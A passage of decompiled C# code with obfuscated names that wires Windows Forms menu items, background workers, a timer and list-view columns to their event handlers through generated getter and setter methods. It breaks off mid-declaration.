	// Token: 0x06001486 RID: 5254 RVA: 0x000A52D0 File Offset: 0x000A34D0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_159(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_93);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_32;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_32 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_32;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06001487 RID: 5255 RVA: 0x0000AEE8 File Offset: 0x000090E8
	internal ToolStripMenuItem vmethod_160()
	{
		return this.toolStripMenuItem_33;
	}

	// Token: 0x06001488 RID: 5256 RVA: 0x0000AEF0 File Offset: 0x000090F0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_161(ToolStripMenuItem toolStripMenuItem_66)
	{
		this.toolStripMenuItem_33 = toolStripMenuItem_66;
	}

	// Token: 0x06001489 RID: 5257 RVA: 0x0000AEF9 File Offset: 0x000090F9
	internal ToolStripMenuItem vmethod_162()
	{
		return this.toolStripMenuItem_34;
	}

	// Token: 0x0600148A RID: 5258 RVA: 0x000A5314 File Offset: 0x000A3514
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_163(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_94);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_34;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_34 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_34;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600148B RID: 5259 RVA: 0x0000AF01 File Offset: 0x00009101
	internal ToolStripSeparator vmethod_164()
	{
		return this.toolStripSeparator_10;
	}

	// Token: 0x0600148C RID: 5260 RVA: 0x0000AF09 File Offset: 0x00009109
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_165(ToolStripSeparator toolStripSeparator_24)
	{
		this.toolStripSeparator_10 = toolStripSeparator_24;
	}

	// Token: 0x0600148D RID: 5261 RVA: 0x0000AF12 File Offset: 0x00009112
	internal BackgroundWorker vmethod_166()
	{
		return this.backgroundWorker_8;
	}

	// Token: 0x0600148E RID: 5262 RVA: 0x000A5358 File Offset: 0x000A3558
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_167(BackgroundWorker backgroundWorker_12)
	{
		DoWorkEventHandler value = new DoWorkEventHandler(this.method_96);
		BackgroundWorker backgroundWorker = this.backgroundWorker_8;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork -= value;
		}
		this.backgroundWorker_8 = backgroundWorker_12;
		backgroundWorker = this.backgroundWorker_8;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork += value;
		}
	}

	// Token: 0x0600148F RID: 5263 RVA: 0x0000AF1A File Offset: 0x0000911A
	internal ToolStripSeparator vmethod_168()
	{
		return this.toolStripSeparator_11;
	}

	// Token: 0x06001490 RID: 5264 RVA: 0x0000AF22 File Offset: 0x00009122
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_169(ToolStripSeparator toolStripSeparator_24)
	{
		this.toolStripSeparator_11 = toolStripSeparator_24;
	}

	// Token: 0x06001491 RID: 5265 RVA: 0x0000AF2B File Offset: 0x0000912B
	internal ToolStripMenuItem vmethod_170()
	{
		return this.toolStripMenuItem_35;
	}

	// Token: 0x06001492 RID: 5266 RVA: 0x0000AF33 File Offset: 0x00009133
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_171(ToolStripMenuItem toolStripMenuItem_66)
	{
		this.toolStripMenuItem_35 = toolStripMenuItem_66;
	}

	// Token: 0x06001493 RID: 5267 RVA: 0x0000AF3C File Offset: 0x0000913C
	internal ToolStripMenuItem vmethod_172()
	{
		return this.toolStripMenuItem_36;
	}

	// Token: 0x06001494 RID: 5268 RVA: 0x000A539C File Offset: 0x000A359C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_173(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_97);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_36;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_36 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_36;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06001495 RID: 5269 RVA: 0x0000AF44 File Offset: 0x00009144
	internal ToolStripSeparator vmethod_174()
	{
		return this.toolStripSeparator_12;
	}

	// Token: 0x06001496 RID: 5270 RVA: 0x0000AF4C File Offset: 0x0000914C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_175(ToolStripSeparator toolStripSeparator_24)
	{
		this.toolStripSeparator_12 = toolStripSeparator_24;
	}

	// Token: 0x06001497 RID: 5271 RVA: 0x0000AF55 File Offset: 0x00009155
	internal ToolStripMenuItem vmethod_176()
	{
		return this.toolStripMenuItem_37;
	}

	// Token: 0x06001498 RID: 5272 RVA: 0x000A53E0 File Offset: 0x000A35E0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_177(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_98);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_37;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_37 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_37;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06001499 RID: 5273 RVA: 0x0000AF5D File Offset: 0x0000915D
	internal ToolStripMenuItem vmethod_178()
	{
		return this.toolStripMenuItem_38;
	}

	// Token: 0x0600149A RID: 5274 RVA: 0x0000AF65 File Offset: 0x00009165
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_179(ToolStripMenuItem toolStripMenuItem_66)
	{
		this.toolStripMenuItem_38 = toolStripMenuItem_66;
	}

	// Token: 0x0600149B RID: 5275 RVA: 0x0000AF6E File Offset: 0x0000916E
	internal ToolStripMenuItem vmethod_180()
	{
		return this.toolStripMenuItem_39;
	}

	// Token: 0x0600149C RID: 5276 RVA: 0x0000AF76 File Offset: 0x00009176
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_181(ToolStripMenuItem toolStripMenuItem_66)
	{
		this.toolStripMenuItem_39 = toolStripMenuItem_66;
	}

	// Token: 0x0600149D RID: 5277 RVA: 0x0000AF7F File Offset: 0x0000917F
	internal ToolStripMenuItem vmethod_182()
	{
		return this.toolStripMenuItem_40;
	}

	// Token: 0x0600149E RID: 5278 RVA: 0x000A5424 File Offset: 0x000A3624
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_183(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_99);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_40;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_40 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_40;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600149F RID: 5279 RVA: 0x0000AF87 File Offset: 0x00009187
	internal ToolStripSeparator vmethod_184()
	{
		return this.toolStripSeparator_13;
	}

	// Token: 0x060014A0 RID: 5280 RVA: 0x0000AF8F File Offset: 0x0000918F
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_185(ToolStripSeparator toolStripSeparator_24)
	{
		this.toolStripSeparator_13 = toolStripSeparator_24;
	}

	// Token: 0x060014A1 RID: 5281 RVA: 0x0000AF98 File Offset: 0x00009198
	internal ToolStripMenuItem vmethod_186()
	{
		return this.toolStripMenuItem_41;
	}

	// Token: 0x060014A2 RID: 5282 RVA: 0x000A5468 File Offset: 0x000A3668
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_187(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_102);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_41;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_41 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_41;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060014A3 RID: 5283 RVA: 0x0000AFA0 File Offset: 0x000091A0
	internal ToolStripMenuItem vmethod_188()
	{
		return this.toolStripMenuItem_42;
	}

	// Token: 0x060014A4 RID: 5284 RVA: 0x000A54AC File Offset: 0x000A36AC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_189(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_101);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_42;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_42 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_42;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060014A5 RID: 5285 RVA: 0x0000AFA8 File Offset: 0x000091A8
	internal ToolStripMenuItem vmethod_190()
	{
		return this.toolStripMenuItem_43;
	}

	// Token: 0x060014A6 RID: 5286 RVA: 0x0000AFB0 File Offset: 0x000091B0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_191(ToolStripMenuItem toolStripMenuItem_66)
	{
		this.toolStripMenuItem_43 = toolStripMenuItem_66;
	}

	// Token: 0x060014A7 RID: 5287 RVA: 0x0000AFB9 File Offset: 0x000091B9
	internal ToolStripMenuItem vmethod_192()
	{
		return this.toolStripMenuItem_44;
	}

	// Token: 0x060014A8 RID: 5288 RVA: 0x000A54F0 File Offset: 0x000A36F0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_193(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_103);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_44;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_44 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_44;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060014A9 RID: 5289 RVA: 0x0000AFC1 File Offset: 0x000091C1
	internal ToolStripSeparator vmethod_194()
	{
		return this.toolStripSeparator_14;
	}

	// Token: 0x060014AA RID: 5290 RVA: 0x0000AFC9 File Offset: 0x000091C9
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_195(ToolStripSeparator toolStripSeparator_24)
	{
		this.toolStripSeparator_14 = toolStripSeparator_24;
	}

	// Token: 0x060014AB RID: 5291 RVA: 0x0000AFD2 File Offset: 0x000091D2
	internal ToolStripMenuItem vmethod_196()
	{
		return this.toolStripMenuItem_45;
	}

	// Token: 0x060014AC RID: 5292 RVA: 0x000A5534 File Offset: 0x000A3734
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_197(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_104);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_45;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_45 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_45;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060014AD RID: 5293 RVA: 0x0000AFDA File Offset: 0x000091DA
	internal BackgroundWorker vmethod_198()
	{
		return this.backgroundWorker_9;
	}

	// Token: 0x060014AE RID: 5294 RVA: 0x000A5578 File Offset: 0x000A3778
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_199(BackgroundWorker backgroundWorker_12)
	{
		DoWorkEventHandler value = new DoWorkEventHandler(this.method_105);
		BackgroundWorker backgroundWorker = this.backgroundWorker_9;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork -= value;
		}
		this.backgroundWorker_9 = backgroundWorker_12;
		backgroundWorker = this.backgroundWorker_9;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork += value;
		}
	}

	// Token: 0x060014AF RID: 5295 RVA: 0x0000AFE2 File Offset: 0x000091E2
	internal ToolStripSeparator vmethod_200()
	{
		return this.toolStripSeparator_15;
	}

	// Token: 0x060014B0 RID: 5296 RVA: 0x0000AFEA File Offset: 0x000091EA
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_201(ToolStripSeparator toolStripSeparator_24)
	{
		this.toolStripSeparator_15 = toolStripSeparator_24;
	}

	// Token: 0x060014B1 RID: 5297 RVA: 0x0000AFF3 File Offset: 0x000091F3
	internal ToolStripMenuItem vmethod_202()
	{
		return this.toolStripMenuItem_46;
	}

	// Token: 0x060014B2 RID: 5298 RVA: 0x000A55BC File Offset: 0x000A37BC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_203(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_106);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_46;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_46 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_46;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060014B3 RID: 5299 RVA: 0x0000AFFB File Offset: 0x000091FB
	internal ToolStripMenuItem vmethod_204()
	{
		return this.toolStripMenuItem_47;
	}

	// Token: 0x060014B4 RID: 5300 RVA: 0x000A5600 File Offset: 0x000A3800
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_205(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_110);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_47;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_47 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_47;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060014B5 RID: 5301 RVA: 0x0000B003 File Offset: 0x00009203
	internal ToolStripSeparator vmethod_206()
	{
		return this.toolStripSeparator_16;
	}

	// Token: 0x060014B6 RID: 5302 RVA: 0x0000B00B File Offset: 0x0000920B
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_207(ToolStripSeparator toolStripSeparator_24)
	{
		this.toolStripSeparator_16 = toolStripSeparator_24;
	}

	// Token: 0x060014B7 RID: 5303 RVA: 0x0000B014 File Offset: 0x00009214
	internal ToolStripSeparator vmethod_208()
	{
		return this.toolStripSeparator_17;
	}

	// Token: 0x060014B8 RID: 5304 RVA: 0x0000B01C File Offset: 0x0000921C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_209(ToolStripSeparator toolStripSeparator_24)
	{
		this.toolStripSeparator_17 = toolStripSeparator_24;
	}

	// Token: 0x060014B9 RID: 5305 RVA: 0x0000B025 File Offset: 0x00009225
	internal ToolStripMenuItem vmethod_210()
	{
		return this.toolStripMenuItem_48;
	}

	// Token: 0x060014BA RID: 5306 RVA: 0x000A5644 File Offset: 0x000A3844
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_211(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_108);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_48;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_48 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_48;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060014BB RID: 5307 RVA: 0x0000B02D File Offset: 0x0000922D
	internal ToolStripSeparator vmethod_212()
	{
		return this.toolStripSeparator_18;
	}

	// Token: 0x060014BC RID: 5308 RVA: 0x0000B035 File Offset: 0x00009235
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_213(ToolStripSeparator toolStripSeparator_24)
	{
		this.toolStripSeparator_18 = toolStripSeparator_24;
	}

	// Token: 0x060014BD RID: 5309 RVA: 0x0000B03E File Offset: 0x0000923E
	internal System.Windows.Forms.Timer vmethod_214()
	{
		return this.timer_1;
	}

	// Token: 0x060014BE RID: 5310 RVA: 0x000A5688 File Offset: 0x000A3888
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_215(System.Windows.Forms.Timer timer_2)
	{
		EventHandler value = new EventHandler(this.method_109);
		System.Windows.Forms.Timer timer = this.timer_1;
		if (timer != null)
		{
			timer.Tick -= value;
		}
		this.timer_1 = timer_2;
		timer = this.timer_1;
		if (timer != null)
		{
			timer.Tick += value;
		}
	}

	// Token: 0x060014BF RID: 5311 RVA: 0x0000B046 File Offset: 0x00009246
	internal OLVColumn vmethod_216()
	{
		return this.olvcolumn_16;
	}

	// Token: 0x060014C0 RID: 5312 RVA: 0x0000B04E File Offset: 0x0000924E
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_217(OLVColumn olvcolumn_19)
	{
		this.olvcolumn_16 = olvcolumn_19;
	}

	// Token: 0x060014C1 RID: 5313 RVA: 0x0000B057 File Offset: 0x00009257
	internal OLVColumn vmethod_218()
	{
		return this.olvcolumn_17;
	}

	// Token: 0x060014C2 RID: 5314 RVA: 0x0000B05F File Offset: 0x0000925F
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_219(OLVColumn olvcolumn_19)
	{
		this.olvcolumn_17 = olvcolumn_19;
	}

	// Token: 0x060014C3 RID: 5315 RVA: 0x0000B068 File Offset: 0x00009268
	internal ToolStripMenuItem vmethod_220()
	{
		return this.toolStripMenuItem_49;
	}

	// Token: 0x060014C4 RID: 5316 RVA: 0x000A56CC File Offset: 0x000A38CC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_221(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_113);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_49;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_49 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_49;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060014C5 RID: 5317 RVA: 0x0000B070 File Offset: 0x00009270
	internal BackgroundWorker vmethod_222()
	{
		return this.backgroundWorker_10;
	}

	// Token: 0x060014C6 RID: 5318 RVA: 0x000A5710 File Offset: 0x000A3910
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_223(BackgroundWorker backgroundWorker_12)
	{
		DoWorkEventHandler value = new DoWorkEventHandler(this.method_111);
		BackgroundWorker backgroundWorker = this.backgroundWorker_10;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork -= value;
		}
		this.backgroundWorker_10 = backgroundWorker_12;
		backgroundWorker = this.backgroundWorker_10;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork += value;
		}
	}

	// Token: 0x060014C7 RID: 5319 RVA: 0x0000B078 File Offset: 0x00009278
	internal BackgroundWorker vmethod_224()
	{
		return this.backgroundWorker_11;
	}

	// Token: 0x060014C8 RID: 5320 RVA: 0x000A5754 File Offset: 0x000A3954
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_225(BackgroundWorker backgroundWorker_12)
	{
		DoWorkEventHandler value = new DoWorkEventHandler(this.method_115);
		BackgroundWorker backgroundWorker = this.backgroundWorker_11;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork -= value;
		}
		this.backgroundWorker_11 = backgroundWorker_12;
		backgroundWorker = this.backgroundWorker_11;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork += value;
		}
	}

	// Token: 0x060014C9 RID: 5321 RVA: 0x0000B080 File Offset: 0x00009280
	internal ToolStripMenuItem vmethod_226()
	{
		return this.toolStripMenuItem_50;
	}

	// Token: 0x060014CA RID: 5322 RVA: 0x000A5798 File Offset: 0x000A3998
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_227(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_116);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_50;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_50 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_50;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060014CB RID: 5323 RVA: 0x0000B088 File Offset: 0x00009288
	internal ToolStripSeparator vmethod_228()
	{
		return this.toolStripSeparator_19;
	}

	// Token: 0x060014CC RID: 5324 RVA: 0x0000B090 File Offset: 0x00009290
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_229(ToolStripSeparator toolStripSeparator_24)
	{
		this.toolStripSeparator_19 = toolStripSeparator_24;
	}

	// Token: 0x060014CD RID: 5325 RVA: 0x0000B099 File Offset: 0x00009299
	internal ToolStripMenuItem vmethod_230()
	{
		return this.toolStripMenuItem_51;
	}

	// Token: 0x060014CE RID: 5326 RVA: 0x0000B0A1 File Offset: 0x000092A1
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_231(ToolStripMenuItem toolStripMenuItem_66)
	{
		this.toolStripMenuItem_51 = toolStripMenuItem_66;
	}

	// Token: 0x060014CF RID: 5327 RVA: 0x0000B0AA File Offset: 0x000092AA
	internal ToolStripMenuItem vmethod_232()
	{
		return this.toolStripMenuItem_52;
	}

	// Token: 0x060014D0 RID: 5328 RVA: 0x000A57DC File Offset: 0x000A39DC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_233(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_120);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_52;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_52 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_52;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060014D1 RID: 5329 RVA: 0x0000B0B2 File Offset: 0x000092B2
	internal ToolStripMenuItem vmethod_234()
	{
		return this.toolStripMenuItem_53;
	}

	// Token: 0x060014D2 RID: 5330 RVA: 0x000A5820 File Offset: 0x000A3A20
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_235(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_123);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_53;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_53 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_53;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060014D3 RID: 5331 RVA: 0x0000B0BA File Offset: 0x000092BA
	internal ToolStripMenuItem vmethod_236()
	{
		return this.toolStripMenuItem_54;
	}

	// Token: 0x060014D4 RID: 5332 RVA: 0x000A5864 File Offset: 0x000A3A64
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_237(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_118);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_54;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_54 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_54;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060014D5 RID: 5333 RVA: 0x0000B0C2 File Offset: 0x000092C2
	internal ToolStripMenuItem vmethod_238()
	{
		return this.toolStripMenuItem_55;
	}

	// Token: 0x060014D6 RID: 5334 RVA: 0x000A58A8 File Offset: 0x000A3AA8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_239(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_119);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_55;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_55 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_55;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060014D7 RID: 5335 RVA: 0x0000B0CA File Offset: 0x000092CA
	internal ToolStripMenuItem vmethod_240()
	{
		return this.toolStripMenuItem_56;
	}

	// Token: 0x060014D8 RID: 5336 RVA: 0x000A58EC File Offset: 0x000A3AEC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_241(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_121);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_56;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_56 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_56;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060014D9 RID: 5337 RVA: 0x0000B0D2 File Offset: 0x000092D2
	internal ToolStripMenuItem vmethod_242()
	{
		return this.toolStripMenuItem_57;
	}

	// Token: 0x060014DA RID: 5338 RVA: 0x000A5930 File Offset: 0x000A3B30
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_243(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_122);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_57;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_57 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_57;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060014DB RID: 5339 RVA: 0x0000B0DA File Offset: 0x000092DA
	internal ToolStripMenuItem vmethod_244()
	{
		return this.toolStripMenuItem_58;
	}

	// Token: 0x060014DC RID: 5340 RVA: 0x000A5974 File Offset: 0x000A3B74
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_245(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_124);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_58;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_58 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_58;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060014DD RID: 5341 RVA: 0x0000B0E2 File Offset: 0x000092E2
	internal ToolStripMenuItem vmethod_246()
	{
		return this.toolStripMenuItem_59;
	}

	// Token: 0x060014DE RID: 5342 RVA: 0x000A59B8 File Offset: 0x000A3BB8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_247(ToolStripMenuItem toolStripMenuItem_66)
	{
		EventHandler value = new EventHandler(this.method_132);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_59;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_59 = toolStripMenuItem_66;
		toolStripMenuItem = this.toolStripMenuItem_59;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060014DF RID: 5343 RVA: 0x0000B0EA File Offset: 0x000092EA
	internal ToolStripSeparator vmethod_248()
	{
		return this.toolStripSeparator_20;
	}

	// Token: 0x060014E0 RID: 5344 RVA: 0x0000B0F2 File Offset: 0x000092F2
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_249(ToolStripSeparator toolStripSeparator_24)
	{
		this.toolStripSeparator_20 = toolStripSeparator_24;
	}

	// Token: 0x060014E1 RID: 5345 RVA: 0x0000B0FB File Offset: 0x000092FB
	internal OLVColumn vmethod_250()
	{
		return this.olvcolumn_18;
	}

	// Token: 0x060014E2 RID: 5346 RVA: 0x0000B103 File Offset: 0x00009303
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_251(OLVColumn olvcolumn_19)
	{
		this.olvcolumn_18 = olvcolumn_19;
	}

	// Token: 0x060014E3 RID: 5347 RVA: 0x0000B10C File Offset: 0x0000930C
	internal ToolStripMenuItem vmethod_252()
	{
		return this.toolStripMenuItem_60;
	}

	// Token: 0x060014E4 RID: 5348 RVA: 0x000A59FC File Offset: 0x000A3BFC
	[MethodImpl(MethodImplOptions.Synchronized)]
